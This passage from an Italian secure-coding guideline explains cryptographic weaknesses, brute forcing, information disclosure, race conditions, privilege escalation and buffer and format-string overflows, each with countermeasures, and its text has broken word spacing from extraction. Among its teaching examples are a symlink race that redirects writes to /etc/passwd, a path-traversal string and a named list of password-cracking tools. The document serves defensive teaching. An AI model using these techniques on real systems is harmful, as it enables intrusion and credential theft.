+applicative, intercettando e ricostruendo il flusso  dei dati in chiaro. Nessuna procedura di decryptin g è 
+necessaria per appropriarsi delle informazioni tras messe. Questo tipo di attacco è anche noto come “Ma n 
+In The Middle” (MITM). 
+Cifrare i dati, tuttavia, potrebbe non essere suffi ciente a impedire lo sniffing. Anche in presenza di  sessioni 
+cifrate, infatti, un aggressore può intercettare ed  archiviare tutto il traffico per cercare di decifr arlo in 
+modalità offline, ovvero a sessione client/server t erminata. Il tipo di algoritmo che l’applicazione 
+implementa e la dimensione della chiave di cifratur a utilizzata giocano un ruolo fondamentale nel gara ntire 
+un’adeguata protezione da questo tipo di attacchi. Se l’applicazione implementa un algoritmo semplice e/o 
+fa uso di una chiave crittografica di dimensioni no n adeguate, un aggressore può riuscire a decifrare i dati 
+scambiati, persino in tempo reale. Le principali te cniche utilizzate per violare una chiave crittograf ica 
+generata attraverso algoritmi simmetrici o di hashi ng vengono descritte nei paragrafi Brute Forcing e 
+Rainbow Table. 
+ 
+Nella crittografia simmetrica, un messaggio viene c ifrato dal mittente con una chiave e decifrato dal 
+destinatario con la stessa chiave attraverso questi  semplici passaggi: 
+il messaggio viene criptato dal mittente:  
+       messaggio_cifrato = funzioneCrittografica(me ssaggio_in_chiaro, 
+chiave_condivisa); 
+e poi decriptato dal destinatario:  
+      messaggio_in_chiaro = funzioneCrittografica(m essaggio_cifrato, 
+chiave_condivisa); 
+La crittografia simmetrica è un esempio di cifratur a debole, poiché la chiave può essere divulgata, 
+intenzionalmente o per errore, con molta facilità. 
+Contromisure 
+La soluzione è la crittografia asimmetrica, a chiav e pubblica/privata, come nelle connessioni SSL/TLS (https). 
+6.3.2  Brute forcing 
+Il brute forcing è la tecnica principalmente utiliz zata da un aggressore per “rompere” la chiave critt ografica 
+di un messaggio testuale o di una sequenza di byte cifrata (ad esempio una password).  
+Un attacco di brute forcing può, tra l'altro, pales arsi tramite ripetuti tentativi di accesso ad un se rvizio, 
+utilizzando una lista di username o password predef initi. Vengono tentate in modo sistematico tutte le  
+possibili combinazioni di un valore crittografato. 
+Un eventuale match identifica la chiave che può ess ere impiegata per riportare l’intero messaggio o la  
+sequenza di byte in chiaro (clear-text). Il brute f orcing è una tecnica che a seconda dell’algoritmo 
+crittografico utilizzato per cifrare un messaggio, e soprattutto della dimensione della chiave, può no n 
+raggiungere l’intento di un aggressore in tempi rag ionevoli. Viene solitamente sfruttata per decifrare  
+password o chiavi cifrate con algoritmi simmetrici.  
+ 
+L’attacco di brute force può essere facilitato nei seguenti casi: 
+• Weak Keys (chiavi deboli): il meccanismo di generaz ione automatico delle chiavi crittografiche di 
+un’applicazione produce delle Weak Keys. Si tratta di chiavi che, quando utilizzate per cifrare un 
+messaggio, generano in output lo stesso messaggio i n chiaro. Questa problematica è strettamente 
+correlata al tipo di algoritmo crittografico utiliz zato e può essere occasionalmente riscontrata 
+durante la generazione di chiavi DES, 3DES, RC4, Bl owfish, IDEA, etc. 
+• Collisioni:  si tratta di una particolarità che si verifica nel caso degli algoritmi di hashing one-wa y 
+(MD5, SHA-1, ecc…). Quando un’applicazione utilizza  questo genere di algoritmi, ad esempio per 
+confrontare la password fornita da un utente con il  valore hash presente in un database, il valore in 
+chiaro proveniente da input viene convertito in has h (una stringa cifrata). L’hash viene poi 
+confrontato direttamente con il valore, sempre cifr ato, mantenuto nel database. Per alcuni 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 34  a 156  
+ 
+algoritmi (come MD5) è matematicamente dimostrata l a possibilità che la cifratura di valori testuali 
+diversi può produrre in output lo stesso hash. Ques ta condizione, definita appunto collisione, può 
+essere utilizzata da un aggressore per autenticarsi  in un portale, fornendo delle credenziali di 
+accesso differenti dalle originali. 
+ 
+L’attacco di brute forcing consiste nell’uso di un tool che elabora ad alta velocità combinazioni 
+alfanumeriche col fine di intercettare chiavi critt ografiche e/o password. Alcuni esempi di tool facil mente 
+reperibili per un’oprazione di brute force attack s ono: Aircrack-ng, John the Ripper, Rainbow Crack, C ain 
+and Abel, L0phtCrack, Ophcrack, ecc. 
+Contromisure 
+Il brute force attack può essere contrastato blocca ndo l’account preso di mira, dopo un certo numero d i 
+tentativi di login falliti. Tuttavia, se l’utente m alevolo ha organizzato l’attacco su un’utenza, ques ta 
+potrebbe essere bloccata nuovameente, anche subito dopo lo sblocco da parte dell’help desk, 
+determinandone la disabilitazione di fatto; se l’at tacco riguarda più utenze ne può derivare un blocco  del 
+sistema (denial of service).  
+Bloccare l’ip dell’aggressore potrebbe portare a es cludere una larga fascia di utenti leciti, in quant o l’ip 
+potrebbe essere quello di un proxy. È preferibile b loccare un ip legandolo a un singolo device e a un singolo 
+browser, attraverso l’uso di un device cookie. 
+Una misura sorprendentemente efficace è quella di u tilizzare risposte imprevedibili agli attacchi brut e 
+force. Ad esempio la web application potrebbe dare codice http 200 (success) e poi reindirizzare la ri sposta 
+su una pagina in cui si spiega che è in corso un br ute force attack. Si può reindirizzare randomicamen te 
+l’utente su una pagina e fargli ridigitare la passw ord. 
+Ogni comportamento “creativo” dell’applicazione può  disinnescare gli automatismi che gli attaccanti ha nno 
+messo in opera. 
+6.3.3  Rainbow table e salt value 
+Una rainbow table è concettualmente una tabella in cui sono mantenuti un numero cospicuo di hash per i  
+quali è già conosciuto il valore originario (testo in chiaro). Si possono comprare in rete svariati te rabyte di 
+tabelle rainbow, in base alla lunghezza delle strin ghe trattate. Un aggressore può quindi determinare in 
+pochi secondi l’esatta corrispondenza (clear text) semplicemente inserendo un hash nel software che 
+gestisce le rainbow table. Questa problematica si v erifica principalmente quando l’applicazione non ut ilizza 
+un salt value per generare un hash. Un salt value è  un fattore randomico che modifica la conformazione  in 
+output dell’hash stesso e non permette di utilizzar e le classiche Rainbow Table per la relativa conver sione 
+in testo in chiaro. 
+ 
+Esempio: nel codice che segue, una chiave ( uncrpyptedPassword ) viene concatenata ad una stringa 
+arbitraria ( salt ), per evitare che venga rivelata attraverso le rainbow tables : 
+ 
+messageDigest = MessageDigest.getInstance("SHA");  
+messageDigest.update((unecryptedPassword+salt).getB ytes());  
+ 
+Contromisure 
+Utilizzare un valore della stringa salt  sufficientemente lungo e complesso, in modo che le  tabelle rainbow 
+diventano completamente inutili ai fini della conve rsione clear text. 
+6.3.4  Archiviazione insicura 
+La trasmissione attraverso la rete di dati in chiar o testo o cifrati con algoritmi crittografici debol i non è 
+l’unica pratica che può portare alla loro appropria zione indebita da parte di un aggressore. Anche arc hiviarli 
+allo stesso modo nel filesystem o in un database pu ò portare alle stesse conseguenze.  
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 35  a 156  
+ 
+Attraverso lo sfruttamento di altre vulnerabilità, quali la SQL injection, il buffer overflow, il dire ctory listing 
+e altre, un aggressore può introdursi nel sistema e  carpire queste informazioni. 
+Non direttamente correlabile con problematiche crit tografiche in senso stretto, la tecnica di File sys tem 
+Polling viene spesso utilizzata da un aggressore co n accesso locale ad un sistema per appropriarsi dei  dati 
+fintanto che essi permangono memorizzati su disco i n forma non cifrata. Questa condizione si verifica 
+quando tali dati vengono temporaneamente salvati pe r lunghi periodi in tabelle di staging o in punti b en 
+precisi del filesystem, prima di essere definitivam ente cifrati. L’aggressore, utilizzando script auto matici, 
+può copiare ciclicamente il contenuto di queste tab elle e directory in locazioni del disco differenti e 
+mantenere i relativi dati in forma intelligibile pe r i suoi scopi. 
+Esempio:  
+È banale accedere a un file non cifrato, contenente  dati elaborati, collocato in una directory raggiun gibile 
+del file system.  
+L’esecuzione del comando more /usr/app/data/accounts.txt  rivela i dettagli degli account che non 
+dovrebbero essere divulgati.  
+Contromisure 
+Occorre applicare le misure di sicurezza citate in precedenza per impedire le problematiche che 
+permettono agli attaccanti di raggiungere il file s ystem. I file e i dati sensibili o cruciali devono essere salvati 
+nel filesystem in collocazioni dotate permessi rest rittivi, solo dopo averli correttamente criptati co n un 
+algoritmo di crittografia “forte”. 
+6.4  Gestione degli errori, delle eccezioni  
+La gestione degli errori, delle eccezioni o delle c ircostanze fuori dalla norma sono tutti quanti aspe tti 
+frequentemente trascurati dagli sviluppatori di sof tware. La non corretta implementazione delle eccezi oni 
+può indurre l’applicazione a: 
+• bloccarsi o sospendersi; 
+• rilasciare informazioni utili all’aggressore per av anzare con successo nella sua azione intrusiva nel 
+sistema; 
+• permettere all’aggressore di acquisire il controllo  diretto del sistema o dell’applicazione. 
+ 
+Esempio:  
+Se l’applicazione non gestisce bene l’errore, le in dicazioni che possono essere mostrate possono forni re 
+molte informazioni all’attaccante, sia sull’applica zione, sia sull’ambiente nel quale gira. Ad esempio  si 
+guardi il seguente stack overflow  mostrato in chiaro sulla pagina web, in seguito a un errore 
+dell’applicazione: 
+ 
+Exception sending context initialized event to list ener instance of class 
+com.selexes.gcm.server.MyServletContextListener jav a.lang.ArithmeticException: / 
+by zero at  
+com.selexes.gcm.server.MyAppServerBase.<init>(MyApp ServerBase.java:46)at 
+com.insecurefirm.MyApp.server.MyAppServerXmpp.<init >(MyAppServerXmpp.java:33) at 
+com.insecurefirm.MyApp.server.MyAppServerXmpp.getIn stance(MyAppServerXmpp.java:77) 
+at 
+com.insecurefirm.MyApp.server.MyAppServerFactory.<i nit>(MyAppServerFactory.java:76 
+)at 
+com.insecurefirm.MyApp.server.MyAppServerFactory.ge tInstance(MyAppServerFactory.ja 
+va:27)at 
+com.insecurefirm.MyApp.server.MyServletContextListe ner.contextInitialized(MyServle 
+tContextListener.java:34)at 
+org.apache.catalina.core.StandardContext.listenerSt art(StandardContext.java:4812)a 
+t 
+org.apache.catalina.core.StandardContext.startInter nal(StandardContext.java:5255)a 
+t org.apache.catalina.util.LifecycleBase.start(Life cycleBase.java:147)at 
+org.apache.catalina.core.ContainerBase$StartChild.c all(ContainerBase.java:1408)at 
+org.apache.catalina.core.ContainerBase$StartChild.c all(ContainerBase.java:1398)at  
+java.util.concurrent.FutureTask.run(Unknown Source) at 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 36  a 156  
+ 
+java.util.concurrent.ThreadPoolExecutor.runWorker(U nknown Source)at  
+java.util.concurrent.ThreadPoolExecutor$Worker.run( Unknown Source) 
+java.lang.Thread.run(Unknown Source) 
+One or more listeners failed to start. Full details  will be found in the 
+appropriate container log file 
+ 
+Di seguito vengono trattate le tecniche più comuni che possono causare l’insorgere delle problematiche  
+descritte nei punti precedenti. 
+6.4.1  User Enumeration 
+Consiste nel tentativo, da parte di un attaccante, di indovinare, attraverso un attacco di brute force , 
+l’esistenza di determinate utenze. Questa vulnerabi lità è presente su quei servizi o quelle applicazio ni che 
+non gestiscono opportunamente le condizioni di erro re durante le fasi di login e/o interrogazione, 
+ritornando messaggi specifici e non generici. Gli a ttacchi di user enumeration colpiscono prevalenteme nte i 
+portali web, seppur l’ambito di sfruttamento non si a unicamente circoscrivibile a questo genere di 
+ambienti. Le applicazioni o i servizi soggetti a ta le problematica vengono stressati da un aggressore con 
+apposite richieste. In base alle risposte ottenute,  l’aggressore è in grado di determinare quali siano  le 
+utenze valide e quali quelle inesistenti nel sistem a/portale. La possibilità di determinare gli utenti  regolari, 
+gli permetterà di utilizzare le informazioni acquis iste come base di partenza per attacchi intrusivi p iù precisi 
+e mirati. Ad esempio, se a seguito di un processo d i autenticazione, in risposta alla sua richiesta di  login, 
+ottiene il messaggio specifico “Nome Utente Errato” , ne conclude che l’utenza utilizzata non esiste; 
+viceversa, se la risposta ritornata è “Password Err ata” viene provata invece la sua esistenza. Condizi oni 
+simili possono essere riscontrate non solo nei proc essi di autenticazione, ma anche di registrazione d i un 
+nuovo utente, di recupero password o in applicazion i server per lo scambio di posta elettronica. 
+ 
+Esempio:  
+Risultato di una procedura di user enumeration su u n modulo di login: 
+ 
+ 
+Contromisure 
+In nessun caso di errore, l’applicazione deve mostr are pagine di dettaglio dell’errore. L’utente deve essere 
+rinviato su una pagina generica che mostra le infor maizoni minime. 
+I messaggi d’errore devono essere il più generico p ossibile, per non dare ad un eventuale attaccante 
+informazioni preziose che ne facilitino l’opera. Ne l caso mostrato, il messaggio potrebbe essere: 
+“Attenzione! Lo username o la password inseriti non  risultano essere corretti”. Per gli utenti con pro filo 
+Amministratore non deve essere consentito l’utilizz o di user name intuitivi quali “Admin”, “Administra tor”, 
+“Superuser” e simili. 
+6.4.2  Information disclosure 
+Le problematiche d’information disclosure sono molt o comuni nelle applicazioni Web anche se non 
+unicamente circoscrivibili a questo ambito. Si mani festano quando un aggressore riesce con apposite 
+richieste a sollecitare una condizione non prevista  o mal gestita dall’applicazione che ritorna messag gi 
+
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 37  a 156  
+ 
+informativi o di errore contenenti dati o informazi oni che possono agevolarlo nella pianificazione di nuovi 
+attacchi intrusivi. Non tutte le condizioni d’infor mation disclosure sono causate da richieste o event i non 
+correttamente gestiti dall’applicazione. Alla radic e di problematiche simili possono anche esservi scr ipt o 
+componenti mal progettati che, interrogati opportun amente con richieste regolari, possono fornire 
+all’aggressore spunti utili per proseguire nella su a attività intrusiva. Sono classificabili come deri vanti da 
+problematiche d’information disclosure le seguenti informazioni rilasciate dall’applicazione ad utenze  
+anonime o non autorizzate, a seguito di richieste m alevole o regolari: 
+• I dati che svelano il percorso o i percorsi su disc o in cui gli script o le componenti dell’applicazio ne 
+sono stati installati e risiedono; 
+• I dati correlabili allo stato attuale dell’applicaz ione, alla sua versione e agli eventuali moduli o p lug-
+in installati; 
+• I dati correlabili ai log delle attività manutentiv e svolte sull’applicazione; 
+• Tutti gli altri dati eventualmente svelati che per l’organizzazione hanno valenza critica, personale o  
+sensibile; 
+• etc. 
+Le applicazioni compilate con l’opzione debugging o  verbose possono essere più facilmente soggette a 
+problematiche di information disclosure. Molte di q ueste condizioni si verificano inoltre a causa di u na poco 
+accorta gestione dell’input utente (vedasi ‘ Valida zione dell'input’ e relativi sottoparagrafi). 
+ 
+Esempio di default script web soggetto a informatio n disclosure: 
+ 
+ 
+
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 38  a 156  
+ 
+ 
+L’esempio di cui sopra mostra come l’applicazione ( a seguito di condizioni mal gestite) fornisce messa ggi 
+informativi o di errore contenenti dati o informazi oni (server type –nginx-, versione ed il S.O. -Ubun tu-) che 
+possono agevolare l’aggressore. 
+Contromisure 
+Per evitare di divulgare importanti informazioni, u tilizzabili da eventuali attaccanti, è necessario c onfigurare 
+l’application server in modo tale che, nelle intest azioni http di risposta non vengano fornite informa zioni 
+quali ad esempio: server type (in questo caso ngix ), nome e/o release del sistema operativo.  
+Per tale finalità, prima di sviluppare l’applicazio ne è fondamentale analizzare le possibili minacce ( threat 
+modeling). L’analisi consente di individuare in man iera più puntuale gli elementi a rischio, che potre bbero 
+portare alla divulgazione d’informazioni utili ad u n eventuale attaccante. 
+6.4.3  Directory Listing 
+Le problematiche di directory listing sono molto co muni nelle applicazioni Web, anche se non unicament e 
+circoscrivibili a quest’ambito. Si manifestano quan do un aggressore riesce con apposite richieste a 
+visualizzare il contenuto di una directory, preleva ndo file dal suo interno o visualizzando dati che 
+dovrebbero di norma essere preclusi agli utenti non  autenticati o che non dispongono di specifici priv ilegi. 
+Comunemente un aggressore riesce a sfruttare questo  tipo di problematiche facendo leva su configurazio ni 
+applicative errate. 
+Esempio di una sessione Directory Listing: 
+ 
+ 
+Contromisure 
+I web sever prevedono l’opzione di abilitare/disabi litare il directory listing. Occorre fare attenzion e che il 
+default non sia l’abilitazione, nel qual caso impos tare la disabilitazione. 
+6.4.4  Denial of Service (DoS) 
+Traduzione di “negazione del servizio”, un denial o f service è una condizione che causa, a seconda di 
+specifiche circostanze, il blocco, la sospensione o  il rallentamento dell’applicazione, di un suo sing olo 
+processo, di un’unica componente o dell’intero sist ema. Ciò è determinato dal tipo di integrazione 
+dell’applicazione stessa con il kernel, le sue stru tture e dai privilegi con i quali viene eseguita. U na 
+
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 39  a 156  
+ 
+condizione di denial of service viene comunemente c ausata da un aggressore che sfrutta errori di 
+programmazione riconducibili a problematiche di ove rflow (descritte nel paragrafo 4.2.6) o come effett o di 
+un attacco non andato a buon fine, che mirava origi nariamente all’esecuzione di uno shellcode. 
+Condizioni di denial of service meno pesanti posson o ad esempio causare il blocco di un account utente . 
+Deadlock  - Nella programmazione multithread, uno degli erro ri che più comunemente da origine a 
+problematiche di Denial Of Service è il deadlock. È  una circostanza che si verifica quando due o più p rocessi 
+si fermano ad aspettarsi l’un l’altro, a tempo inde finito. La condizione che sbloccherebbe l’attesa, c he 
+potrebbe essere il termine di esecuzione di una pro cedura o il liberamento di una risorsa che causa il  
+blocco, non si verifica mai. 
+ 
+Esempio di crash di un’applicazione che presenta un a problematica di Stack Overflow: 
+ 
+ 
+L’attacco è andato a buon fine pertanto l’applicazi one necessita di essere riavviata per fornire nuova mente 
+il servizio  agli utenti. 
+Contromisure 
+Dato che il denial of service può essere causato da  numerose condizioni inerenti l’applicazione o l’am biente 
+operativo, le contromisure comprendono una serie di  best practises di programmazione che limitino al 
+minimo la superficie d’attacco. 
+A livello di web server è possibile: definire il nu mero massimo di richieste accettabili per una conne ssione 
+TCP; stabilire un timeout e la dimensione massima d el body di una singola richiesta; definire un timeo ut per 
+ogni connessione. 
+6.4.5  Race condition 
+La race condition, dove “race “ sta per “corsa” è u na situazione che si verifica in un ambiente 
+multithreading, dove più processi entrano in compet izione per le stesse risorse. Ciò è possibile quand o è 
+importante la sequenza delle operazioni, ma l’acces so alle risorse da parte dei vari thread non è sogg etto 
+ad alcun vincolo. 
+La circostanza più classica è riconducibile a quell e applicazioni che devono scrivere dei dati sul dis co dopo 
+aver effettuato una serie di controlli preventivi. Un aggressore può usufruire del lasso di tempo in c ui questi 
+controlli vengono effettuati, o bloccare per un suf ficiente periodo la loro esecuzione, sfruttando una  
+vulnerabilità logica dell‘applicazione (ad esempio un deadlock momentaneo), per alterare il dato di 
+destinazione.  
+Le conseguenze di una modifica malevola del dato po ssono variare da un errore logico o applicativo, fi no al 
+crash dell’applicazione, o addirittura del sistema,  se si riesce a generare un errore di overflow. 
+ 
+Esempio:  
+Il frammento di codice che segue; verifica l’access o a un determinato file e nel caso in cui l’esito d ella 
+verifica sia ‘truè, apre il file in scrittura: 
+if (access("file", W_OK) != 0) { 
+  exit(1); 
+} 
+fd = open("file", O_WRONLY); 
+// Actually writing over /etc/passwd 
+write(fd, buffer, sizeof(buffer)); 
+Se fra il controllo e l’apertura del file, l’attacc ante riesce a creare un link simbolico a “file” att raverso la 
+seguente sequenza di codice:  
+symlink("/etc/passwd", "file"); 
+
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 40  a 156  
+ 
+l’attaccante riesce a manomettere il comportamento del programma che andrà quindi a scrivere nel file 
+sbagliato.  
+Contromisure 
+La gestione della concorrenza fra diversi processi all’interno della stessa applicazione è una questio ne 
+piuttosto delicata. Massima cura deve essere presta ta, in fase di progettazione, al problema della 
+competizione fra diversi thread per le stesse risor se. Non c’è una regola universale, ma i vari lingua ggi di 
+programmazione offrono diversi strumenti per la ges tione di questo specifico aspetto. 
+La sincronizzazione di metodi e classi o l’uso di s emafori sono di solito i rimedi adottati per preven ire 
+questo problema. 
+6.4.6  Privilege Escalation e aggiramento dei permessi ute nte 
+Le eccezioni e le condizioni non previste o mal ges tite sono sfruttate molto spesso dagli aggressori p er 
+ottenere un innalzamento dei privilegi (privilege e scalation), ovvero la possibilità di svolgere opera zioni sul 
+sistema o sulla stessa applicazione con privilegi s uperiori rispetto a quelli posseduti prima dell’att acco. Ad 
+esempio, sfruttando con successo uno Stack Overflow , l’aggressore che da remoto poteva unicamente 
+godere dei privilegi di un utente anonimo o di bass o profilo, può successivamente operare nel sistema 
+come se fosse un utente locale a cui sono stati ass egnati permessi amministrativi. Analogamente sfrutt ando 
+una situazione di race condition, l’aggressore può modificare un file pur non possedendo come utenza 
+originaria gli effettivi privilegi di scrittura. Ne l caso di un Directory Listing può invece accedere ad aree 
+riservate di un portale ancor prima di autenticarsi , bypassando il meccanismo con il quale l’applicazi one 
+assegna i permessi agli utenti regolari. 
+Le motivazioni che rendono solitamente possibile un  Privilege Escalation sono menzionate di seguito: 
+• l’applicazione, il servizio o il singolo componente  vengono avviati con i privilegi amministrativi; 
+• L’applicazione utilizza privilegi amministrativi an che quando svolge azioni per conto di un’utenza 
+non privilegiata; 
+• Nei sistemi Unix o derivati il bit Set-User-ID è at tivo. 
+ 
+Una privilege escalation non si definisce tale solo  quando l’innalzamento dei privilegi riguarda diret tamente 
+il passaggio da un’utenza non privilegiata a una pr ivilegiata, ma anche quando lo scambio di permessi 
+avviene tra utenze non privilegiate. 
+ 
+Esempio:  
+Attraverso la tecnica del path traversal, l’attacca nte è in grado di individuare le pagine che consent ono 
+l’accesso senza autenticazione: 
+ 
+ /../.././userProfiles.html 
+ 
+Contromisure 
+È necessario progettare l’applicazione in modo tale  da impedire che informazioni utili all’attacco pos sano 
+essere svelate in caso di errore o di un’eventualit à non gestita.   
+6.5  Bound checking e problematiche di overflow 
+Le problematiche di Overflow si verificano solitame nte quando i dati provenienti da input utente, senz a 
+prima essere adeguatamente verificati, vengono memo rizzati all’interno di buffer non abbastanza grandi  
+per contenerli. Ciò è all’origine di differenti con seguenze, a seconda delle regioni di memoria in cui  
+l’overflow si è manifestato e delle aree sovrascrit te. In alcuni casi, l’aggressore può sfruttare l’ar ea di 
+memoria sovrascritta per eseguire comandi remoti fi nalizzati all’apertura di un canale di accesso al s istema 
+vulnerabile. Altre volte viene semplicemente genera to un crash dell’applicazione o del sistema, con 
+conseguente interruzione nell’erogazione del serviz io (DoS).  
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 41  a 156  
+ 
+Altri problemi di overflow si manifestano a seguito  di circostanze diverse e non necessariamente corre labili 
+alla copia o allo spostamento di dati in un buffer insufficiente. Le principali problematiche di overf low oggi 
+conosciute vengono di seguito descritte. 
+6.5.1  Stack overflow 
+Il principio di sfruttamento è molto semplice e si basa sulla possibilità di saturare un buffer oltre le sue reali 
+capacità di contenimento, fino a sovrascrivere l’in dirizzo di ritorno della funzione vulnerabile. L’in dirizzo di 
+ritorno è un valore posizionato nella regione di me moria stack che permette all’applicazione, al rient ro 
+della funzione chiamata, di riprendere l’esecuzione  dall’istruzione immediatamente successiva. Questo 
+valore è puntato da diversi registri, in base all’a rchitettura hardware per la quale l’applicazione è stata 
+compilata (ad esempio EIP su piattaforma x86 o RIP su piattaforma x64). Riuscendo a saturare un buffer  
+oltre le sue capacità di contenimento, un aggressor e ha la possibilità di sovrascrivere, con valori 
+prettamente arbitrari, tutte le aree di memoria adi acenti, fino a giungere all’indirizzo di ritorno, f acendo 
+proseguire l’esecuzione del programma da qualsiasi indirizzo di memoria desiderato, deviando il regola re 
+flusso esecutivo dell’applicazione. 
+L’esecuzione di codice malevolo attraverso uno stac k overflow si sostanzia fondamentalmente in tre ste p: 
+• l’aggressore satura il buffer non soggetto a bound- checking e colloca ad un certo punto della 
+memoria lo shellcode; 
+• l’aggressore sovrascrive l’indirizzo di ritorno del la funzione vulnerabile con l’indirizzo in memoria in 
+cui risiede lo shellcode; 
+• Dal ritorno della funzione lo shellcode viene esegu ito; 
+ 
+Esempio:  
+Rappresentazione generica di uno stack overflow: 
+ 
+Contromisure 
+Il programmatore deve configurare i cicli sugli arr ay in modo da non superare il numero di elementi 
+previsto. Un loop per tutta la lunghezza possibile  del buffer potrebbe attivare il codice malevolo. 
+6.5.2  Off-by-one/Off-by-few 
+Gli overflow che si manifestano nello stack sono og gi meno frequenti rispetto al passato, ma non sono del 
+tutto scomparsi. In realtà, queste problematiche so no ancora riscontrabili nei moderni software, a cau sa di 
+errate pratiche di programmazione. Gli overflow def initi Off-by-one o Off-by-few ne sono la dimostrazi one 
+palese. Rientrano in questa categoria tutti gli ove rflow che, al contrario degli stack overflow, perme ttono di 
+eccedere solo di uno o pochi byte oltre le reali ca pacità di contenimento di un buffer. Questa condizi one, a 
+seconda del  compilatore utilizzato, della predispo sizione dei buffer e delle variabili in memoria e q uindi 
+soprattutto dell’architettura hardware su cui il so ftware gira, può permettere ad un aggressore di alt erare a 
+
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 42  a 156  
+ 
+piacimento il flusso di esecuzione dell’applicazion e, senza intaccare in modo diretto l’indirizzo di r itorno 
+della funzione vulnerabile. In genere è sufficiente  raggiungere l’ultimo byte dell’indirizzo dello sta ck frame 
+della funzione vulnerabile (il frame pointer puntat o ad esempio nell’architettura hardware x86 dal reg istro 
+EBP) per sfruttare l’attacco eseguendo uno shellcod e. Questo genere di errori si verifica molto spesso  
+all’interno di cicli. 
+ 
+Esempio:  
+Esempio corretto di riempimento di un buffer 
+ 
+In una situazione normale la variabile buffer[104] dovrebbe contenere 103 byte di dati seguiti dal 
+terminatore stringa NULL (‘\0’)  
+ 
+Esempio errato di buffer sovrascritto di pochi byte  oltre le sue reali capacità di contenimento 
+ 
+Contromisure 
+Gli sviluppatori devono porre la massima attenzione  sui loop all’interno degli array, rispettando la 
+lunghezza allocata. I null di terminazione stringa devono essere conteggiati e considerati. 
+6.5.3  Format string overflow 
+Il Format string overflow è una tecnica abbastanza recente, descritta nella sua capacità di eseguire 
+istruzioni remote su un sistema durante la prima me tà del 2000. Precedentemente nota per i soli effett i di 
+blocco di un’applicazione, questo genere di overflo w si può manifestare nelle regioni di memoria stack  o 
+heap. Si verifica quando non viene specificato deli beratamente il formato di funzioni che lavorano le 
+stringhe (ad esempio printf, fprintf, sprintf, snpr intf), costruendo tale formato a partire dall’input  utente.  
+Tramite il format string “%n”, un aggressore può, i nfatti, scrivere un valore arbitrario in un qualsia si punto 
+dello spazio di memoria allocato per il processo de ll’applicazione. 
+L’esecuzione di codice malevolo attraverso un forma t string overflow si sostanzia fondamentalmente in tre 
+step: 
+• L’aggressore colloca in un certo punto in memoria l o shellcode; 
+• L’aggressore individua in memoria l’indirizzo di ri torno della funzione vulnerabile e lo sovrascrive 
+con l’indirizzo in cui risiede lo shellcode; 
+• Al ritorno dalla funzione lo shellcode viene esegui to. 
+Questa tecnica è soggetta a variazioni nel caso di buffer che risiedono nella regione di memoria heap,  dove 
+per eseguire lo shellcode è eventualmente possibile  sfruttare indirizzi di chiamata a funzioni di hook , 
+puntatori a funzioni di distruzione (Destructor) in vocate all’uscita dell’applicazione, puntatori a ge stori delle 
+eccezioni o puntatori a funzioni residenti in libre rie esterne linkate con l’applicazione. Un aggresso re può 
+utilizzare uno di questi puntatori anche nel caso i n cui l’overflow si manifesta nella regione di memo ria 
+stack (ad esempio per bypassare restrizioni di tipo  stack canary/cookie o in quelle architetture in cu i lo 
+stack non risulti essere eseguibile). 
+Esempio 
+Se l’applicazione accetta parametri di sostituzione  come %x  e %s  in istruzioni come la printf :  
+ 
+printf(“valore immesso: %s”, valoreInput); 
+  
+      1      2     3     4     5     6     7      8      9    10    11                        98   99  100 101 102  103          
+ 
+ NULL byte 
+ 
+              ……… 
+ 
+      1     2     3     4      5      6     7      8     9    10   11                         98  99   100 101  102 103 104  105 
+……… … 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 43  a 156  
+ 
+L’attaccante sostituendo il valore del campo in inp ut (valoreInput ) con %x farà perdere all’applicazione 
+il riferimento corretto: l’applicazione cercherà il valore corrispondente nel la memoria stack senza riuscire a 
+trovarlo. A questo punto l’attacco ha conseguenze a ncora più gravi se all’indirizzo di memoria di quel la 
+variabile, l’attaccante fa corrispondere una funzio ne inserita ad hoc dallo stesso. 
+Contromisure 
+Non utilizzare mai l’input dell’utente come stringa  di formattazione per le funzioni tipo printf e sca nf senza 
+averlo prima verificato. 
+6.5.4  Heap overflow 
+I buffer allocati dinamicamente da un’applicazione risiedono nella regione di memoria heap e sono 
+sottoposti a problematiche di overflow così come qu elli residenti nello stack. Un luogo comune del pas sato 
+oramai sfatato era che problematiche di questo tipo  non potessero essere sfruttate da un aggressore pe r 
+eseguire uno shellcode per via dell’assenza di un i ndirizzo di ritorno che potesse essere utilizzato c ome 
+puntatore al codice malevolo. Un heap overflow si m anifesta solitamente quando un buffer che viene 
+deallocato contiene dati arbitrari provenienti da i nput utente o quando successivamente ad un overflow  ne 
+viene allocato uno nuovo. In entrambi i casi, secon do l’architettura, si viene a creare una condizione  adatta 
+per l’esecuzione fraudolenta di uno shellcode. La t ecnica è resa possibile manipolando i puntatori all e aree 
+di memoria (chunk) che vengono liberati/allocati.  
+Presi tre elementi (A, B e C) appartenenti a una li sta circolare, per liberare la memoria di B, A dovr à 
+riconoscere C come elemento successivo e C dovrà ri conoscere A come elemento precedente: 
+ 
+ 
+ 
+Quando l’applicazione deve allocare un nuovo buffer  dinamico, l’Heap Manager osserva questa lista per 
+determinare quale è il prossimo chunk utilizzabile ed aggiorna opportunamente i puntatori. Quando 
+l’applicazione deve liberare un buffer dinamico, l’ Heap Manager aggiorna allo stesso modo i puntatori per 
+tenere traccia dei chunk inutilizzati. Gli indirizz i di memoria indirizzati da tali puntatori vengono mantenuti 
+all’interno di strutture apposite (header) antepost e a ciascun chunk. Con il manifestarsi di un Heap 
+Overflow, l’header del chunk adiacente può essere a rtificiosamente modificato dall’aggressore che, 
+manipolando a piacimento i puntatori della struttur a, può scrivere un qualsiasi valore all’interno di 
+qualunque indirizzo residente nello spazio di memor ia del processo in esecuzione. 
+L’esecuzione di codice malevolo attraverso un Heap Overflow si sostanzia fondamentalmente in quattro 
+step: 
+• L’aggressore colloca in un certo punto in memoria l o shellcode e sovrascrive opportunamente il 
+buffer residente nell’Heap; 
+• L’aggressore sollecita o attende che l’area di memo ria sovrascritta venga liberata dall’applicazione 
+o ne venga sequenzialmente allocata una nuova; 
